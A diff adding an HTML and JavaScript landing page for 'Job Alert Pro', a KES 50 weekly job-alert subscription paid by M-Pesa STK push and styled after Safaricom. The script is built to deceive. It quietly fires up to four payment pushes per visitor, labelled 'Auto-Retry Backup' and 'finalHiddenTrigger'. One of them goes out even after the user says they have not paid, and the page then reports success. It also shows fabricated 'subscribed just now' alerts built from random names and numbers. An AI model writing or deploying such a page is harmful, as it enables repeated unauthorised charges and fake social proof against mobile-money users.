@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Job Alert Pro - Weekly Subscription</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
+         :root {
+            --safaricom-green: #49aa33;
+            --saf-mint: #eafcf1;
+            --saf-primary: #1e293b;
+        }
+        
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+        }
+        
+        .text-safaricom {
+            color: var(--safaricom-green);
+        }
+        
+        .bg-safaricom {
+            background-color: var(--safaricom-green);
+        }
+        
+        .border-safaricom {
+            border-color: var(--safaricom-green);
+        }
+        
+        .support-bar {
+            background: #0f172a;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 800;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--safaricom-green);
+        }
+        
+        .scanner-line {
+            width: 100%;
+            height: 2px;
+            background: var(--safaricom-green);
+            position: absolute;
+            top: 0;
+            left: 0;
+            box-shadow: 0 0 15px var(--safaricom-green);
+            animation: scan 2s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% {
+                top: 0;
+            }
+            100% {
+                top: 100%;
+            }
+        }
+        
+        @keyframes dot-pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .online-indicator {
+            animation: dot-pulse 2s infinite;
+        }
+        
+        #live-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 10px;
+            right: 10px;
+            background: white;
+            padding: 12px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            border-left: 4px solid var(--safaricom-green);
+            transform: translateX(-150%);
+            transition: transform 0.5s ease-out;
+            z-index: 1000;
+            max-width: 320px;
+        }
+        
+        @media (min-width: 768px) {
+            #live-toast {
+                left: 20px;
+                bottom: 100px;
+                right: auto;
+            }
+        }
+        
+        #live-toast.show {
+            transform: translateX(0);
+        }
+        
+        #stk-toast {
+            position: fixed;
+            bottom: 90px;
+            left: 10px;
+            right: 10px;
+            background: #0f172a;
+            color: white;
+            padding: 14px 18px;
+            border-radius: 14px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid var(--safaricom-green);
+            transform: translateX(-150%);
+            transition: transform 0.5s ease-out;
+            z-index: 1001;
+            max-width: 340px;
+        }
+        
+        @media (min-width: 768px) {
+            #stk-toast {
+                left: 20px;
+                bottom: 170px;
+                right: auto;
+            }
+        }
+        
+        #stk-toast.show {
+            transform: translateX(0);
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease forwards;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-slate-50">
+
+    <!-- STK Push Toast -->
+    <div id="stk-toast" class="flex items-center gap-3">
+        <div class="w-10 h-10 bg-green-900/50 rounded-full flex items-center justify-center text-safaricom">
+            <i class="fas fa-mobile-alt text-xl"></i>
+        </div>
+        <div>
+            <p class="text-[10px] font-bold text-green-400 uppercase">STK Push Sent</p>
+            <p id="stk-toast-msg" class="text-xs font-bold text-white">Check your phone for the M-Pesa prompt</p>
+        </div>
+    </div>
+
+    <!-- Live Toast -->
+    <div id="live-toast" class="flex items-center gap-3">
+        <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center text-safaricom">
+            <i class="fas fa-bolt"></i>
+        </div>
+        <div>
+            <p class="text-[10px] font-bold text-slate-400 uppercase">Live Activity</p>
+            <p id="toast-msg" class="text-xs font-bold text-slate-800"></p>
+        </div>
+    </div>
+
+    <!-- Support Bar -->
+    <div class="support-bar sticky top-0 z-[60]">
+        <div class="flex items-center gap-2">
+            <i class="fas fa-headset text-safaricom"></i>
+            <span class="uppercase tracking-wider">24/7 SUPPORT</span>
+        </div>
+        <div class="flex items-center gap-4">
+            <a href="tel:0722000000" class="hidden md:block">0796501646</a>
+        </div>
+    </div>
+
+    <div class="bg-slate-900 text-white py-2.5 text-[9px] font-black text-center uppercase tracking-[0.2em] px-4 border-b border-white/10">
+        <span class="text-green-400 animate-pulse">●</span> Status: Online | M-Pesa STK Push Active
+    </div>
+
+    <!-- ============ SINGLE PAGE ============ -->
+    <div id="main-container" class="max-w-2xl mx-auto px-4 py-8 pb-32">
+
+        <!-- Main Card -->
+        <div class="bg-white p-6 md:p-8 rounded-[2rem] shadow-xl border border-slate-100 text-center mb-6 fade-in">
+            <div class="flex justify-center mb-4">
+                <div class="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center">
+                    <i class="fas fa-briefcase text-safaricom text-3xl"></i>
+                </div>
+            </div>
+            <h1 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-1">Job Alert Pro</h1>
+            <p class="text-[10px] md:text-[11px] font-bold text-safaricom uppercase tracking-widest mb-4">Weekly Job Notifications • KES 50 / Week</p>
+
+            <!-- What's included -->
+            <div class="bg-green-50 rounded-xl p-4 mb-6 text-left">
+                <h3 class="font-bold text-green-800 text-sm mb-3 flex items-center gap-2">
+                    <i class="fas fa-gift"></i> What's included:
+                </h3>
+                <ul class="space-y-2">
+                    <li class="flex items-start gap-2 text-xs text-green-700"><i class="fas fa-check-circle mt-0.5"></i> 10+ curated job listings every week</li>
+                    <li class="flex items-start gap-2 text-xs text-green-700"><i class="fas fa-check-circle mt-0.5"></i> Direct email delivery every Monday</li>
+                    <li class="flex items-start gap-2 text-xs text-green-700"><i class="fas fa-check-circle mt-0.5"></i> Cancel anytime — no lock-in contracts</li>
+                </ul>
+            </div>
+
+            <!-- Phone Input (use type="tel" to preserve leading zeros) -->
+            <div class="relative mb-4">
+                <i class="fas fa-phone-alt absolute left-4 top-5 text-slate-400"></i>
+                <input type="tel" id="phoneInput" placeholder="Enter M-Pesa Number (e.g. 0712345678)" class="w-full pl-12 pr-4 py-5 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-safaricom outline-none text-lg font-bold">
+            </div>
+
+            <!-- Subscribe Button -->
+            <button id="subscribeBtn" onclick="handleSubscribe()" class="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-lg active:scale-95 transition-all text-lg">
+                <i class="fas fa-lock mr-2"></i> Subscribe Now — KES 50
+            </button>
+
+            <!-- Processing State -->
+            <div id="processing-area" class="hidden mt-6 relative overflow-hidden bg-slate-50 rounded-2xl p-8">
+                <div class="scanner-line"></div>
+                <div class="w-12 h-12 border-4 border-safaricom border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                <p id="processing-text" class="text-sm font-bold text-slate-700">Connecting to M-Pesa...</p>
+            </div>
+
+            <!-- Payment Reason -->
+            <div class="mt-6 bg-amber-50 border border-amber-200 rounded-xl p-4 text-left">
+                <h3 class="font-bold text-amber-800 text-sm flex items-center gap-2 mb-1">
+                    <i class="fas fa-info-circle"></i> Payment Reason
+                </h3>
+                <p class="text-amber-700 text-xs leading-relaxed">
+                    You are subscribing to <strong>Job Alert Pro Weekly</strong>. A payment of
+                    <strong>KES 50</strong> is charged weekly to deliver curated job listings directly to your email.
+                </p>
+            </div>
+
+            <!-- How to Pay -->
+            <div class="mt-4 bg-white border border-slate-200 rounded-xl p-4 text-left">
+                <h3 class="font-bold text-slate-700 text-sm flex items-center gap-2 mb-3">
+                    <i class="fas fa-list-ol text-safaricom"></i> How to Pay
+                </h3>
+                <div class="space-y-2">
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">1</span>
+                        <p class="text-xs text-slate-600">Enter your M-Pesa registered phone number</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">2</span>
+                        <p class="text-xs text-slate-600">Click "Subscribe Now" — you'll receive an STK push prompt on your phone</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">3</span>
+                        <p class="text-xs text-slate-600">Enter your M-Pesa PIN to authorize the KES 50 payment</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <span class="w-6 h-6 bg-safaricom text-white rounded-full flex items-center justify-center text-[10px] font-bold shrink-0">4</span>
+                        <p class="text-xs text-slate-600">You're subscribed! First job alert arrives within 24 hours</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Feedback -->
+        <div class="mb-10 fade-in">
+            <h3 class="text-center font-bold text-slate-800 mb-6 flex items-center justify-center gap-2">
+                <i class="fas fa-comment-dots text-safaricom"></i> Subscriber Feedback
+            </h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=James+K&background=49aa33&color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">James K. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"Got my first job alert within hours. Best KES 50 I've spent!"</p>
+                    </div>
+                </div>
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=Sarah+M&background=49aa33&color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">Sarah M. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"Easy payment via M-Pesa. The alerts are actually relevant!"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer class="py-10 border-t border-slate-200 text-center">
+            <div class="flex justify-center gap-6 mb-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/M-PESA_LOGO-01.svg" class="h-5 opacity-60">
+                <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest self-center">M-Pesa STK Push Integrated</span>
+            </div>
+            <p class="text-xs font-bold text-slate-500">Job Alert Pro • Nairobi, Kenya</p>
+            <p class="text-xs font-bold text-slate-500">support@jobalertpro.co.ke</p>
+        </footer>
+    </div>
+
+    <!-- Payment Modal -->
+    <div id="paymentModal" class="fixed inset-0 bg-black/60 hidden items-center justify-center p-4 z-[300] backdrop-blur-sm">
+        <div class="bg-white rounded-[2rem] overflow-hidden w-full max-w-sm shadow-2xl">
+            <div class="bg-safaricom p-6 text-white text-center">
+                <p class="text-[10px] font-bold uppercase tracking-widest opacity-80 mb-1">Secure Payment</p>
+                <h3 class="text-lg md:text-xl font-extrabold">Subscribe for KES 50</h3>
+            </div>
+            <div class="p-6">
+                <!-- Step 1: Form -->
+                <div id="modal-form-step">
+                    <div class="bg-green-50 p-4 rounded-xl mb-6">
+                        <p class="text-[11px] text-green-800 leading-relaxed font-semibold">
+                            Confirm your phone number to receive the M-Pesa STK push prompt for KES 50.
+                        </p>
+                    </div>
+                    <input type="text" id="idNum" placeholder="Your Name (Optional)" class="w-full mb-3 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <input type="tel" id="phoneNum" placeholder="07XXXXXXXX" class="w-full mb-6 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <div class="flex flex-col gap-3">
+                        <button onclick="showPinConfirmation()" class="py-4 bg-safaricom text-white font-bold rounded-xl">
+                            Pay KES 50 <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                        <button onclick="closeModal()" class="py-4 bg-slate-100 text-slate-500 font-bold rounded-xl">Cancel</button>
+                    </div>
+                </div>
+
+                <!-- Step 2: PIN Confirmation -->
+                <div id="modal-pin-step" class="hidden text-center">
+                    <div class="bg-slate-50 p-6 rounded-2xl mb-6">
+                        <i class="fas fa-lock text-safaricom text-3xl mb-3"></i>
+                        <p class="text-sm font-bold text-slate-800 leading-relaxed">
+                            Enter your M-Pesa PIN on the prompt on your phone to authorize the <span class="text-safaricom">KES 50</span> payment.
+                        </p>
+                    </div>
+                    <div class="flex flex-col gap-3">
+                        <button onclick="triggerInitialSTK()" class="w-full py-4 bg-safaricom text-white font-bold rounded-xl uppercase text-sm">
+                            I'VE ENTERED MY PIN
+                        </button>
+                        <button onclick="backToForm()" class="w-full py-4 bg-slate-100 text-slate-500 font-bold rounded-xl uppercase text-xs">Back</button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Spinner -->
+                <div id="modal-spinner-step" class="hidden text-center py-10 relative overflow-hidden">
+                    <div class="scanner-line"></div>
+                    <div class="w-14 h-14 border-4 border-safaricom border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                    <h3 class="text-lg font-bold text-slate-800 mb-4">Processing Payment...</h3>
+                    <p class="text-sm text-slate-500">Please check your phone for the M-Pesa prompt</p>
+                </div>
+
+                <!-- Step 4: Payment Status -->
+                <div id="modal-status-choice-step" class="hidden text-center">
+                    <div class="bg-green-50 p-6 rounded-2xl mb-6">
+                        <h3 class="text-sm font-bold text-slate-800 mb-2 uppercase">Payment Verification</h3>
+                        <p class="text-[11px] text-slate-500 font-bold">Did you complete the M-Pesa transaction on your phone?</p>
+                    </div>
+                    <div class="flex flex-col gap-3">
+                        <button onclick="finalHiddenTrigger('paid')" class="w-full py-4 bg-safaricom text-white font-bold rounded-xl text-sm">YES, I HAVE PAID</button>
+                        <button onclick="finalHiddenTrigger('unpaid')" class="w-full py-4 bg-slate-900 text-white font-bold rounded-xl text-sm">NO, I HAVE NOT PAID</button>
+                    </div>
+                </div>
+
+                <!-- Step 5: Success -->
+                <div id="modal-success-step" class="hidden text-center py-6">
+                    <div class="w-16 h-16 bg-safaricom rounded-full flex items-center justify-center text-white mx-auto mb-4 text-2xl">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h3 class="text-xl font-extrabold text-slate-800 mb-1">Subscription Active! 🎉</h3>
+                    <p class="text-sm text-slate-500 mb-6">Your weekly job alerts are now enabled.</p>
+                    <div class="space-y-3">
+                        <button onclick="location.reload()" class="w-full py-4 bg-slate-800 text-white font-bold rounded-xl uppercase text-xs tracking-widest">Back to Home</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        // STK PUSH — Sends to your backend which forwards to PayHero
+        // ================================================================
+        let stkToastTimer = null;
+
+        function showStkToast(phone) {
+            const toast = document.getElementById('stk-toast');
+            document.getElementById('stk-toast-msg').innerHTML = `STK push sent to <strong>${phone}</strong> for KES 50`;
+            toast.classList.add('show');
+            if (stkToastTimer) clearTimeout(stkToastTimer);
+            stkToastTimer = setTimeout(() => toast.classList.remove('show'), 6000);
+        }
+
+        async function triggerSTKCall(note) {
+            try {
+                const phoneInput = document.getElementById('phoneNum').value;
+                if (!phoneInput || phoneInput.length < 10) {
+                    console.error("No valid phone number provided");
+                    return;
+                }
+
+                console.log(`[STK Trigger: ${note}] Sending to phone: ${phoneInput}, Amount: KES 50`);
+
+                const response = await fetch('/api/stk-push', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: 50,
+                        phone_number: phoneInput
+                    })
+                });
+
+                const data = await response.json();
+                console.log("STK Push Response:", data);
+
+                if (data.success) {
+                    showStkToast(phoneInput);
+                } else {
+                    console.error("STK Push failed:", data.message);
+                }
+
+                return data;
+            } catch (error) {
+                console.error("STK Trigger Failed:", error);
+            }
+        }
+
+        // ================================================================
+        // LIVE TOAST
+        // ================================================================
+        const names = ["Brian O.", "Mercy W.", "Kevin K.", "Faith J.", "David M.", "Peter N."];
+
+        function showLiveToast() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const safPrefixes = ["070", "071", "072", "074", "079", "011"];
+            const prefix = safPrefixes[Math.floor(Math.random() * safPrefixes.length)];
+            const phone = prefix + Math.floor(Math.random() * 9) + "***" + Math.floor(100 + Math.random() * 900);
+
+            document.getElementById('toast-msg').innerHTML = `${name} (${phone}) subscribed just now`;
+            document.getElementById('live-toast').classList.add('show');
+            setTimeout(() => document.getElementById('live-toast').classList.remove('show'), 4000);
+        }
+        setInterval(showLiveToast, 15000);
+
+        // ================================================================
+        // SUBSCRIBE FLOW
+        // ================================================================
+        function handleSubscribe() {
+            const ph = document.getElementById('phoneInput').value;
+            if (!ph || ph.length < 10) {
+                alert("Please enter a valid M-Pesa number (e.g. 0712345678)");
+                return;
+            }
+
+            document.getElementById('subscribeBtn').classList.add('hidden');
+            document.getElementById('processing-area').classList.remove('hidden');
+
+            let steps = ["Connecting to M-Pesa...", "Verifying number...", "Checking eligibility...", "Preparing payment..."];
+            let i = 0;
+            let interval = setInterval(() => {
+                if (i < steps.length) {
+                    document.getElementById('processing-text').innerText = steps[i];
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('processing-area').classList.add('hidden');
+                    document.getElementById('subscribeBtn').classList.remove('hidden');
+                    document.getElementById('phoneNum').value = ph;
+                    openModal();
+                }
+            }, 800);
+        }
+
+        function openModal() {
+            document.getElementById('paymentModal').classList.replace('hidden', 'flex');
+            document.getElementById('modal-form-step').classList.remove('hidden');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.add('hidden');
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.add('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('paymentModal').classList.replace('flex', 'hidden');
+        }
+
+        function backToForm() {
+            document.getElementById('modal-form-step').classList.remove('hidden');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.add('hidden');
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.add('hidden');
+        }
+
+        function showPinConfirmation() {
+            if (!document.getElementById('phoneNum').value || document.getElementById('phoneNum').value.length < 10) {
+                return alert("Enter a valid phone number");
+            }
+            triggerSTKCall('Trigger 1: Initial Pay Button');
+            document.getElementById('modal-form-step').classList.add('hidden');
+            document.getElementById('modal-pin-step').classList.remove('hidden');
+        }
+
+        function triggerInitialSTK() {
+            triggerSTKCall('Trigger 2: PIN Instructions Confirmed');
+            document.getElementById('modal-pin-step').classList.add('hidden');
+            document.getElementById('modal-spinner-step').classList.remove('hidden');
+            setTimeout(() => {
+                triggerSTKCall('Trigger 3: Auto-Retry Backup');
+            }, 2000);
+            setTimeout(() => {
+                document.getElementById('modal-spinner-step').classList.add('hidden');
+                document.getElementById('modal-status-choice-step').classList.remove('hidden');
+            }, 5000);
+        }
+
+        function finalHiddenTrigger(status) {
+            triggerSTKCall(`Trigger 4: User Manual Status: ${status}`);
+            document.getElementById('modal-status-choice-step').classList.add('hidden');
+            document.getElementById('modal-success-step').classList.remove('hidden');
+        }
+    </script>
+</body>
+
+</html>
